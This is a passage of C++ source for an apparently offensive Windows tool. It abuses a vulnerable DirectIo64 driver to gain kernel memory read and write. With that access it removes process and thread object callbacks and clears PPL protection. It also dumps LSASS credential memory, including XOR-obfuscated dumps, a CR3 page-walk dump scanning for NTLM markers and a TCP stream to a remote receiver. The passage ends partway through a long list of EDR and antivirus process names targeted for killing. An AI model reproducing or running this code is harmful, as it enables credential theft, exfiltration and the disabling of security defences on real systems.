        in, sizeof(in), out, sizeof(out), &got, nullptr) != 0;
}

static bool DirectIo_KRead(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T rem   = 0x1000 - (SIZE_T)(pCurVA & 0xFFF);
        SIZE_T chunk = std::min(size, rem);
        QWORD pa = DirectIo_HelpVa2Pa(pCurVA);
        if (!pa) return false;
        if (!DirectIo_ReadPhys((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static bool DirectIo_KWrite(QWORD va, PVOID buf, SIZE_T size) {
    auto pCurVA  = va;
    auto pCurBuf = (PUCHAR)buf;
    while (size > 0) {
        SIZE_T rem   = 0x1000 - (SIZE_T)(pCurVA & 0xFFF);
        SIZE_T chunk = std::min(size, rem);
        QWORD pa = DirectIo_HelpVa2Pa(pCurVA);
        if (!pa) return false;
        if (!DirectIo_WritePhys((PVOID)pa, chunk, pCurBuf)) return false;
        pCurVA  += chunk;
        pCurBuf += chunk;
        size    -= chunk;
    }
    return true;
}

static QWORD DirectIo_FindDriverBase(QWORD ntosBase) {
    QWORD psmodAddr = FindNtosExport(ntosBase, "PsLoadedModuleList");
    if (!psmodAddr) { printf("[-] PsLoadedModuleList export not found\n"); return 0; }
    QWORD first = KReadQword(psmodAddr);
    if (!first) { printf("[-] *PsLoadedModuleList is NULL\n"); return 0; }
    QWORD entry = first;
    for (int i = 0; i < 4096 && entry; i++) {
        QWORD dllBase = KReadQword(entry + 0x30);
        if (dllBase) {
            BYTE mz[2]{};
            if (KRead(dllBase, mz, 2) && mz[0] == 'M' && mz[1] == 'Z') {
                BYTE text[30]{};
                if (KRead(dllBase + 0x1000, text, sizeof(text)) &&
                    memcmp(text, kDirectIoPrefix, sizeof(kDirectIoPrefix) - 1) == 0 &&
                    (text[sizeof(kDirectIoPrefix) - 1] == 0x2C ||
                     text[sizeof(kDirectIoPrefix) - 1] == 0x28)) {
                    printf("[+] DirectIo64 module base: 0x%llX\n", dllBase);
                    return dllBase;
                }
            }
        }
        QWORD flink = KReadQword(entry);
        if (!flink || flink == first) break;
        entry = flink;
    }
    printf("[-] DirectIo64 module not found in PsLoadedModuleList\n");
    return 0;
}

static QWORD DirectIo_LocateGatePa() {
    QWORD ntosBase = DirectIo_GetNtosBase();
    if (!ntosBase) { printf("[-] ntoskrnl base not found for DirectIo gate locate\n"); return 0; }
    QWORD base = DirectIo_FindDriverBase(ntosBase);
    if (!base) return 0;
    QWORD gateVa = base + 0x3601;
    QWORD pa = DirectIo_HelpVa2Pa(gateVa);
    if (!pa) { printf("[-] VA->PA failed for DirectIo gate VA 0x%llX\n", gateVa); return 0; }
    printf("[+] DirectIo gate VA 0x%llX -> PA 0x%llX\n", gateVa, pa);
    return pa;
}

static bool DirectIo_EnableWrite(QWORD gatePaOverride) {
    if (g_directioWrite) return true;
    QWORD gatePa = gatePaOverride;
    if (!gatePa) gatePa = DirectIo_LocateGatePa();
    if (!gatePa) return false;

    g_directioGatePa = gatePa;
    BYTE cur = 0;
    DirectIo_ReadPhys((PVOID)gatePa, 1, &cur);
    printf("[*] DirectIo gate byte at PA 0x%llX: 0x%02X\n", gatePa, cur);
    if (cur == 0x28) {
        g_directioWrite = true;
        printf("[+] DirectIo write gate already patched\n");
        return true;
    }
    if (cur != 0x2C) {
        printf("[-] Unexpected DirectIo gate byte; expected 0x2C or 0x28\n");
        return false;
    }
    if (!DirectIo_BitClear(gatePa, 2)) {
        printf("[-] DirectIo bit-clear failed (%lu)\n", GetLastError());
        return false;
    }
    BYTE after = 0;
    DirectIo_ReadPhys((PVOID)gatePa, 1, &after);
    if (after & 0x04) {
        printf("[-] DirectIo gate patch did not clear bit 2: 0x%02X\n", after);
        return false;
    }
    g_directioGatePa = gatePa;
    g_directioWrite = true;
    printf("[+] DirectIo write gate patched: 0x%02X -> 0x%02X\n", cur, after);
    return true;
}

static bool DirectIo_WriteSelfTest() {
    if (!g_directioWrite || !g_directioGatePa) {
        printf("[-] DirectIo write self-test unavailable (write not enabled or gate PA unknown)\n");
        return false;
    }
    BYTE cur = 0;
    if (!DirectIo_ReadPhys((PVOID)g_directioGatePa, 1, &cur)) return false;
    printf("[test] DirectIo gate byte before write-map self-test: 0x%02X\n", cur);
    if (cur != 0x28) {
        printf("[-] DirectIo gate byte is not patched (expected 0x28)\n");
        return false;
    }
    BYTE orig = 0x2C;
    if (!DirectIo_WritePhys((PVOID)g_directioGatePa, 1, &orig)) {
        printf("[-] DirectIo write-map self-test: write 0x2C failed\n");
        return false;
    }
    BYTE chk = 0;
    if (!DirectIo_ReadPhys((PVOID)g_directioGatePa, 1, &chk) || chk != 0x2C) {
        printf("[-] DirectIo write-map self-test: restore readback 0x%02X != 0x2C\n", chk);
        return false;
    }
    BYTE patch = 0x28;
    if (!DirectIo_WritePhys((PVOID)g_directioGatePa, 1, &patch)) {
        printf("[-] DirectIo write-map self-test: re-apply 0x28 failed\n");
        return false;
    }
    chk = 0;
    if (!DirectIo_ReadPhys((PVOID)g_directioGatePa, 1, &chk) || chk != 0x28) {
        printf("[-] DirectIo write-map self-test: re-apply readback 0x%02X != 0x28\n", chk);
        return false;
    }
    printf("[+] DirectIo write-map self-test PASSED (0x28 -> 0x2C -> 0x28 at PA 0x%llX)\n", g_directioGatePa);
    return true;
}

// ---------------------------------------------------------------------------
// ObCallback operations
// ---------------------------------------------------------------------------
static void UnlinkCallbackList(const char* typeName, QWORD listHead) {
    QWORD flink = KReadQword(listHead);
    if (flink == listHead || !flink) {
        printf("[+] %s CallbackList already empty\n", typeName);
        return;
    }
    QWORD entry = flink;
    int seen = 0;
    while (entry && entry != listHead && seen < 64) {
        QWORD pre  = KReadQword(entry + 0x28);
        QWORD post = KReadQword(entry + 0x30);
        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
               typeName, seen, entry, pre, post);
        entry = KReadQword(entry);
        seen++;
    }
    printf("[*] Unlinking %d %s callback(s)...\n", seen, typeName);
    if (!KWrite(listHead,     &listHead, 8) ||
        !KWrite(listHead + 8, &listHead, 8)) {
        printf("[-] KWrite %s CallbackList unlink failed\n", typeName);
        return;
    }
    printf("[+] %s ObCallback list unlinked (%d entries)\n", typeName, seen);
}

static void ListCallbackList(const char* typeName, QWORD listHead) {
    QWORD flink = KReadQword(listHead);
    if (flink == listHead || !flink) {
        printf("[*] %s CallbackList: empty\n", typeName);
        return;
    }
    QWORD entry = flink;
    int seen = 0;
    while (entry && entry != listHead && seen < 64) {
        QWORD pre  = KReadQword(entry + 0x28);
        QWORD post = KReadQword(entry + 0x30);
        printf("[*]   %s entry[%d] 0x%llX: pre=0x%llX post=0x%llX\n",
               typeName, seen, entry, pre, post);
        entry = KReadQword(entry);
        seen++;
    }
    printf("[*] %s CallbackList: %d registration(s) found\n", typeName, seen);
}

static bool PatchObCallbacks(QWORD ntosBase) {
    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
    QWORD procObjType = KReadQword(psProcTypeAddr);
    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
    UnlinkCallbackList("Process", procObjType + 0xC8);

    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
    if (psThreadTypeAddr) {
        QWORD threadObjType = KReadQword(psThreadTypeAddr);
        if (threadObjType) {
            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
            UnlinkCallbackList("Thread", threadObjType + 0xC8);
        }
    }
    return true;
}

static bool ListCallbacks(QWORD ntosBase) {
    QWORD psProcTypeAddr = FindNtosExport(ntosBase, "PsProcessType");
    if (!psProcTypeAddr) { printf("[-] PsProcessType export not found\n"); return false; }
    QWORD procObjType = KReadQword(psProcTypeAddr);
    if (!procObjType) { printf("[-] *PsProcessType is NULL\n"); return false; }
    printf("[*] OBJECT_TYPE (Process): 0x%llX\n", procObjType);
    ListCallbackList("Process", procObjType + 0xC8);

    QWORD psThreadTypeAddr = FindNtosExport(ntosBase, "PsThreadType");
    if (psThreadTypeAddr) {
        QWORD threadObjType = KReadQword(psThreadTypeAddr);
        if (threadObjType) {
            printf("[*] OBJECT_TYPE (Thread): 0x%llX\n", threadObjType);
            ListCallbackList("Thread", threadObjType + 0xC8);
        }
    }
    return true;
}

// ---------------------------------------------------------------------------
// CR3-based physical process memory access (for --dump-kernel)
// ---------------------------------------------------------------------------
static QWORD Cr3VaToPa(QWORD cr3, QWORD va) {
    QWORD pml4_idx = (va >> 39) & 0x1FF;
    QWORD pdpt_idx = (va >> 30) & 0x1FF;
    QWORD pd_idx   = (va >> 21) & 0x1FF;
    QWORD pt_idx   = (va >> 12) & 0x1FF;
    QWORD offset   = va & 0xFFF;

    QWORD pml4e = 0; BiosTool_ReadPhys((PVOID)((cr3 & ~0xFFFULL) + pml4_idx * 8), 8, &pml4e);
    if (!(pml4e & 1)) return 0;
    QWORD pdpte = 0; BiosTool_ReadPhys((PVOID)((pml4e & ~0xFFFULL) + pdpt_idx * 8), 8, &pdpte);
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    QWORD pde = 0; BiosTool_ReadPhys((PVOID)((pdpte & ~0xFFFULL) + pd_idx * 8), 8, &pde);
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    QWORD pte = 0; BiosTool_ReadPhys((PVOID)((pde & ~0xFFFULL) + pt_idx * 8), 8, &pte);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | offset;
}

static bool PhysReadProcessMemory(QWORD cr3, QWORD va, PVOID buf, SIZE_T size) {
    auto pOut = (PUCHAR)buf;
    while (size > 0) {
        QWORD pageOff = va & 0xFFF;
        QWORD chunk   = std::min(size, (SIZE_T)(0x1000 - pageOff));
        QWORD pa = Cr3VaToPa(cr3, va);
        if (!pa) {
            memset(pOut, 0, chunk);
        } else {
            if (!BiosTool_ReadPhys((PVOID)pa, chunk, pOut)) return false;
        }
        va   += chunk;
        pOut += chunk;
        size -= chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// PPL operations
// ---------------------------------------------------------------------------
struct PplResult { bool ok; QWORD eproc; BYTE before; char name[16]; };

static PplResult StripPpl(QWORD sysEproc, DWORD pid, bool dryRun, bool clearSigLevel = false) {
    PplResult r{};
    r.eproc = FindEprocessByPid(sysEproc, pid, r.name);
    if (!r.eproc) { printf("[-] PID %lu not found\n", pid); return r; }
    printf("[+] Target EPROCESS: 0x%llX (%s)\n", r.eproc, r.name);

    ScanAndFixOffsets(r.eproc, pid);

    BYTE sigLevel = 0, secSigLevel = 0;
    KRead(r.eproc + g_off.Protection - 2, &sigLevel,    1);
    KRead(r.eproc + g_off.Protection - 1, &secSigLevel, 1);
    KRead(r.eproc + g_off.Protection,     &r.before,    1);
    printf("[*] SignatureLevel=0x%02X  SectionSignatureLevel=0x%02X  Protection=0x%02X\n",
           sigLevel, secSigLevel, r.before);

    if (dryRun) { printf("[dry-run] Skipping write\n"); r.ok = true; return r; }
    if (r.before == 0 && !clearSigLevel) { printf("[!] Protection already 0x00\n"); r.ok = true; return r; }

    if (clearSigLevel) {
        BYTE zero = 0;
        KWrite(r.eproc + g_off.Protection - 2, &zero, 1);
        KWrite(r.eproc + g_off.Protection - 1, &zero, 1);
    }

    BYTE zero = 0;
    if (!KWrite(r.eproc + g_off.Protection, &zero, 1)) {
        printf("[-] KWrite Protection failed (%lu)\n", GetLastError()); return r;
    }
    BYTE after = 0xFF;
    KRead(r.eproc + g_off.Protection, &after, 1);
    if (after != 0) { printf("[-] Write issued but Protection=0x%02X\n", after); return r; }
    printf("[!!!] Protection byte cleared (0x%02X -> 0x00)\n", r.before);
    r.ok = true;
    return r;
}

// Restore all three protection bytes (used after MiniDumpWriteDump).
static void RestorePpl(QWORD eproc, BYTE protection, BYTE sigLevel, BYTE secSigLevel) {
    KWrite(eproc + g_off.Protection - 2, &sigLevel,    1);
    KWrite(eproc + g_off.Protection - 1, &secSigLevel, 1);
    KWrite(eproc + g_off.Protection,     &protection,  1);
    BYTE check = 0;
    KRead(eproc + g_off.Protection, &check, 1);
    printf("[*] Protection restored: 0x%02X (verify: 0x%02X)\n", protection, check);
}

// Set PPL: type=Protected(2), signer=WinSystem(6) -> Protection byte = 0x62
static bool PplAdd(QWORD sysEproc, DWORD pid) {
    char nm[16]{};
    QWORD ep = FindEprocessByPid(sysEproc, pid, nm);
    if (!ep) { printf("[-] PID %lu not found\n", pid); return false; }
    printf("[+] Target EPROCESS: 0x%llX (%s)\n", ep, nm);

    BYTE cur = 0; KRead(ep + g_off.Protection, &cur, 1);
    printf("[*] Current Protection: 0x%02X\n", cur);

    // PS_PROTECTION: Level = (Signer<<4) | (Type) = (6<<4) | 2 = 0x62
    BYTE ppl = 0x62;
    if (!KWrite(ep + g_off.Protection, &ppl, 1)) {
        printf("[-] KWrite Protection failed\n"); return false;
    }
    BYTE check = 0; KRead(ep + g_off.Protection, &check, 1);
    printf("[+] Protection set to 0x%02X (verify: 0x%02X) - PsProtectedTypeProtected/WinSystem\n", ppl, check);
    return (check == ppl);
}

// ---------------------------------------------------------------------------
// Process finder
// ---------------------------------------------------------------------------
static DWORD FindPidByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) do {
        char nm[MAX_PATH]{};
        WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nm, sizeof(nm), nullptr, nullptr);
        if (_stricmp(nm, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

// ---------------------------------------------------------------------------
// LSASS dump - MiniDumpWriteDump path (deprecated: use --dump-rpm instead)
// ---------------------------------------------------------------------------
static bool DumpLsass(DWORD pid, const char* outPath, bool noXor, BYTE xorKey = 0x55) {
    EnablePrivilege("SeDebugPrivilege");

    typedef NTSTATUS(WINAPI* NtSP_t)(HANDLE);
    auto NtSP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSuspendProcess");
    auto NtRP = (NtSP_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtResumeProcess");

    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess %lu failed (%lu)\n", pid, GetLastError()); return false; }

    if (NtSP) { NTSTATUS st = NtSP(hTarget); printf("[*] NtSuspendProcess: 0x%lX\n", (ULONG)st); }

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, FILE_SHARE_READ, nullptr,
                              CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFile %s failed (%lu)\n", outPath, GetLastError());
        if (NtRP) NtRP(hTarget);
        CloseHandle(hTarget);
        return false;
    }

    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory | MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules | MiniDumpWithFullMemoryInfo |
        MiniDumpWithThreadInfo | MiniDumpWithTokenInformation);

    printf("[*] MiniDumpWriteDump PID=%lu...\n", pid);
    BOOL ok = MiniDumpWriteDump(hTarget, pid, hOut, dumpType, nullptr, nullptr, nullptr);
    DWORD err = GetLastError();

    FlushFileBuffers(hOut);
    CloseHandle(hOut);
    if (NtRP) NtRP(hTarget);
    CloseHandle(hTarget);

    if (!ok) { printf("[-] MiniDumpWriteDump failed, GLE=%lu\n", err); return false; }

    LARGE_INTEGER sz{};
    HANDLE hCheck = CreateFileA(outPath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                nullptr, OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) { GetFileSizeEx(hCheck, &sz); CloseHandle(hCheck); }
    printf("[!!!] Dump written to %s (%lld bytes)\n", outPath, sz.QuadPart);

    if (!noXor && sz.QuadPart > 0) {
        HANDLE hXor = CreateFileA(outPath, GENERIC_READ|GENERIC_WRITE, 0,
                                  nullptr, OPEN_EXISTING, 0, nullptr);
        if (hXor != INVALID_HANDLE_VALUE) {
            const DWORD CHUNK = 1024*1024;
            std::vector<BYTE> xbuf(CHUNK);
            DWORD got = 0;
            LARGE_INTEGER pos{};
            SetFilePointerEx(hXor, pos, nullptr, FILE_BEGIN);
            while (ReadFile(hXor, xbuf.data(), CHUNK, &got, nullptr) && got > 0) {
                for (DWORD i = 0; i < got; i++) xbuf[i] ^= xorKey;
                LARGE_INTEGER back{}; back.QuadPart = -(LONGLONG)got;
                SetFilePointerEx(hXor, back, nullptr, FILE_CURRENT);
                DWORD w = 0; WriteFile(hXor, xbuf.data(), got, &w, nullptr);
            }
            CloseHandle(hXor);
            printf("[*] Output XOR'd with 0x%02X\n", xorKey);
        }
    }

    return sz.QuadPart > 0;
}

// ---------------------------------------------------------------------------
// LSASS dump - ReadProcessMemory path
// ---------------------------------------------------------------------------
static bool DumpRpm(DWORD pid, const char* outPath) {
    EnablePrivilege("SeDebugPrivilege");
    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }

    FILE* fOut = fopen(outPath, "wb");
    if (!fOut) { printf("[-] fopen %s failed\n", outPath); CloseHandle(hTarget); return false; }

    MEMORY_BASIC_INFORMATION mbi{};
    BYTE* addr = nullptr;
    SIZE_T totalBytes = 0, regions = 0;
    printf("[*] DumpRpm: scanning LSASS virtual memory...\n");
    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            (mbi.Protect & PAGE_NOACCESS) == 0) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                QWORD base = (QWORD)mbi.BaseAddress;
                QWORD sz   = bytesRead;
                fwrite(&base, 8, 1, fOut);
                fwrite(&sz,   8, 1, fOut);
                fwrite(buf.data(), 1, bytesRead, fOut);
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
    }
    fflush(fOut);
    fclose(fOut);
    CloseHandle(hTarget);
    printf("[*] DumpRpm: %zu regions, %zu bytes -> %s\n", regions, totalBytes, outPath);
    return totalBytes > 0;
}

// ---------------------------------------------------------------------------
// LSASS dump - TCP streaming (disk-free)
// ---------------------------------------------------------------------------
static bool DumpRpmTcp(DWORD pid, const char* recvIp, int recvPort) {
    EnablePrivilege("SeDebugPrivilege");
    HANDLE hTarget = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hTarget) { printf("[-] OpenProcess PROCESS_VM_READ failed (%lu)\n", GetLastError()); return false; }

    WSADATA wsa{};
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup failed\n"); CloseHandle(hTarget); return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        printf("[-] socket() failed\n"); WSACleanup(); CloseHandle(hTarget); return false;
    }
    DWORD tv = 30000;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    struct sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((u_short)recvPort);
    inet_pton(AF_INET, recvIp, &sa.sin_addr);

    printf("[*] Connecting to %s:%d...\n", recvIp, recvPort);
    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        printf("[-] connect() failed (%d)\n", WSAGetLastError());
        closesocket(sock); WSACleanup(); CloseHandle(hTarget); return false;
    }
    printf("[+] Connected. Streaming LSASS memory...\n");

    MEMORY_BASIC_INFORMATION mbi{};
    BYTE* addr = nullptr;
    SIZE_T totalBytes = 0, regions = 0;

    auto sendAll = [&](const void* data, int len) -> bool {
        const char* p = (const char*)data;
        while (len > 0) {
            int sent = send(sock, p, len, 0);
            if (sent <= 0) return false;
            p += sent; len -= sent;
        }
        return true;
    };

    while (VirtualQueryEx(hTarget, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & PAGE_GUARD) == 0 &&
            (mbi.Protect & PAGE_NOACCESS) == 0) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hTarget, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead) && bytesRead > 0) {
                QWORD base = (QWORD)mbi.BaseAddress;
                QWORD sz   = bytesRead;
                if (!sendAll(&base, 8) || !sendAll(&sz, 8) || !sendAll(buf.data(), (int)bytesRead)) {
                    printf("[-] send() failed at region 0x%llX\n", base);
                    break;
                }
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)addr < (QWORD)mbi.BaseAddress) break;
    }

    closesocket(sock);
    WSACleanup();
    CloseHandle(hTarget);
    printf("[+] DumpRpmTcp: %zu regions, %zu bytes sent to %s:%d\n", regions, totalBytes, recvIp, recvPort);
    return totalBytes > 0;
}

// ---------------------------------------------------------------------------
// Kernel-direct dump via CR3 page walk
// ---------------------------------------------------------------------------
static bool DumpKernel(QWORD sysEproc, DWORD pid, const char* outPath) {
    char nm[16]{};
    QWORD lsassEp = FindEprocessByPid(sysEproc, pid, nm);
    if (!lsassEp) { printf("[-] LSASS EPROCESS not found\n"); return false; }

    QWORD cr3 = KReadQword(lsassEp + 0x28);
    printf("[*] LSASS EPROCESS: 0x%llX  CR3: 0x%llX\n", lsassEp, cr3);
    if (!cr3) { printf("[-] CR3 read returned 0\n"); return false; }

    // Try to find user-mode CR3 (KPTI shadow PML4)
    static const DWORD ucrOffsets[] = { 0x388, 0x280, 0x3B8, 0x028 };
    QWORD useCr3 = cr3;
    for (DWORD off : ucrOffsets) {
        QWORD cand = KReadQword(lsassEp + off);
        if (!cand || cand == cr3) continue;
        QWORD candBase = cand & ~0xFFFULL;
        QWORD pml4_0 = 0;
        if (BiosTool_ReadPhys((PVOID)candBase, 8, &pml4_0) && (pml4_0 & 1)) {
            printf("[*] UserDirectoryTableBase @ 0x%lX = 0x%llX\n", off, cand);
            useCr3 = cand;
            break;
        }
    }
    if (useCr3 == cr3)
        printf("[!] Using kernel CR3 - user-mode pages may not all translate\n");

    // Need a query handle to enumerate regions
    typedef NTSTATUS(NTAPI* NtQVM_t)(HANDLE, PVOID, ULONG, PVOID, SIZE_T, PSIZE_T);
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto NtQVM = (NtQVM_t)GetProcAddress(ntdll, "NtQueryVirtualMemory");
    if (!NtQVM) { printf("[-] NtQueryVirtualMemory not found\n"); return false; }

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_QUERY_LIMITED_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    }
    if (!hProc) { printf("[-] Cannot open LSASS for query (%lu)\n", GetLastError()); return false; }

    HANDLE hOut = CreateFileA(outPath, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
                              FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hOut == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return false; }

    struct { char magic[8]; QWORD va; QWORD size; } regionHdr;
    memcpy(regionHdr.magic, "CASCRAW\0", 8);

    QWORD addr = 0x10000;
    MEMORY_BASIC_INFORMATION mbi{};
    SIZE_T retLen = 0;
    int regions = 0, hits = 0;
    const BYTE needle[] = { 'N',0,'T',0,'L',0,'M',0 };

    bool earlyStop = false;
    while (!earlyStop && addr < 0x7FFFFFFFFFFF00ULL) {
        NTSTATUS st = NtQVM(hProc, (PVOID)addr, 0, &mbi, sizeof(mbi), &retLen);
        if (!NT_SUCCESS(st)) break;
        // Include MEM_PRIVATE, MEM_MAPPED, and MEM_IMAGE - all committed readable regions
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READWRITE | PAGE_EXECUTE_READ |
                            PAGE_EXECUTE_READWRITE | PAGE_READONLY)) &&
            !(mbi.Protect & PAGE_NOACCESS) && !(mbi.Protect & PAGE_GUARD)) {
            SIZE_T rsz = mbi.RegionSize;
            if (rsz > 16ULL * 1024 * 1024) rsz = 16ULL * 1024 * 1024;
            std::vector<BYTE> rbuf(rsz, 0);
            if (PhysReadProcessMemory(useCr3, (QWORD)mbi.BaseAddress, rbuf.data(), rsz)) {
                regionHdr.va   = (QWORD)mbi.BaseAddress;
                regionHdr.size = rsz;
                DWORD w = 0;
                WriteFile(hOut, &regionHdr, sizeof(regionHdr), &w, nullptr);
                WriteFile(hOut, rbuf.data(), (DWORD)rsz, &w, nullptr);
                regions++;
                for (SIZE_T i = 0; i + sizeof(needle) < rsz && !earlyStop; i++) {
                    if (memcmp(&rbuf[i], needle, sizeof(needle)) == 0) {
                        hits++;
                        printf("[+] NTLM marker at LSASS VA 0x%llX\n",
                               (QWORD)mbi.BaseAddress + i);
                        if (hits > 64) earlyStop = true;
                    }
                }
            }
        }
        addr = (QWORD)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(hProc);
    CloseHandle(hOut);
    printf("[+] Kernel-direct dump: %d regions, %d NTLM markers -> %s\n",
           regions, hits, outPath);
    return regions > 0;
}

// ---------------------------------------------------------------------------
// EDR kill - full process list (merged from UsingBYOVD)
// ---------------------------------------------------------------------------
static const char* kEdrProcs[] = {
    // Acronis
    "acronis_agent.exe","BackupAndRecoveryAgent.exe","managementagenthost.exe","mms.exe",
    // AlienVault
    "alienvault-agent.exe","osqueryd.exe",
    // Avast
    "afwServ.exe","aswEngSrv.exe","aswidsagent.exe","aswToolsSvc.exe",
    "AvastSvc.exe","AvastUI.exe","bccavsvc.exe","wsc_proxy.exe",
    // AVG
    "AVGUI.exe","AVGSvc.exe","avgnt.exe","avgsvca.exe","avgToolsSvc.exe",
    // Binary Defense
    "BinaryDefenseAgent.exe",
    // Bitdefender
    "Arrakis3.exe","BDAvScanner.exe","BDFsTray.exe","BDFileServer.exe","BDLived2.exe",
    "BDLogger.exe","BDScheduler.exe","BDStatistics.exe","bdagent.exe","bdemsrv.exe",
    "bdntwrk.exe","bdredline.exe","bdregsvr2.exe","bdservicehost.exe",
    // Blumira
    "BlumiraAgent.exe",
    // Carbon Black
    "cb.exe","cbcomms.exe","cbdefense.exe","carbonsensor.exe","RepMgr.exe",
    // Cisco Talos
    "cfrutil.exe","cisco_amp_connector.exe","immunet.exe",
    // CrowdStrike
    "CSFalconContainer.exe","CSFalconService.exe","CSFalconUI.exe",
    "csfalcondataprotect.exe","REPRSVC.EXE",
    // Cynet
    "CynetEPS.exe","CynetMS.exe","CynetSvc.exe",
    // Cybereason
    "ActiveConsole.exe","cybereason.exe","CybereasonActiveProbe.exe","CybereasonCR.exe",
    // Cylance / BlackBerry
    "CylanceSvc.exe",
    // Darktrace
    "DarktraceTSA.exe",
    // Deep Instinct
    "DeepInstinct.exe","DeepInstinctService.exe","DIAgentService.exe",
    // Elastic
    "elastic-endpoint.exe","elastic-agent.exe","a2guard.exe","a2service.exe",
    // ESET
    "eamonm.exe","eamsi.exe","ecls.exe","efwd.exe","egui.exe","eguiProxy.exe",
    "ekrn.exe","ekrnEpfw.exe","ERAAgent.exe","EraAgentSvc.exe",
    // Fortinet
    "firesvc.exe","firetray.exe","FortiTray.exe","fortiedr.exe",
    // Heimdal
    "HeimdalsecurityAgent.exe",
    // Huntress
    "HuntressAgent.exe","HuntressRMM.exe",
    // Kaspersky
    "avp.exe","avpsus.exe","avpui.exe","kavfs.exe","kavfsscs.exe","kavfswh.exe",
    "kavfswp.exe","kavtray.exe","klactprx.exe","klcsldcl.exe","klcsweb.exe",
    "klnagent.exe","klnagchk.exe","klscctl.exe","klserver.exe","klwtblfs.exe",
    "kpf4ss.exe","ksde.exe","ksdeui.exe","vapm.exe",
    // McAfee / Trellix
    "masvc.exe","macmnsvc.exe","McAfeeAgent.exe","mcshield.exe","mfeann.exe",
    "mfevtps.exe","mfetp.exe","mfeepehost.exe","mfefire.exe","mfemactl.exe",
    "mfemacsvc.exe","mfemgr.exe","mfemms.exe","MgntSvc.exe","tepfsvc.exe",
    // Microsoft Defender
    "MSASCui.exe","MSASCuiL.exe","MpDefenderCoreService.exe","MsMpEng.exe",
    "MsMpSvc.exe","MsSense.exe","msseces.exe","NisSrv.exe","SecurityHealthService.exe",
    "SenseCncProxy.exe","SenseIR.exe","SenseNdr.exe","SenseSampleUploader.exe",
    "smartscreen.exe","windefend.exe","WinDefend.exe",
    // Morphisec
    "MorphisecService.exe",
    // Norton / Symantec
    "ccApp.exe","ccSvcHst.exe","ns.exe","nsservice.exe","nortonsecurity.exe",
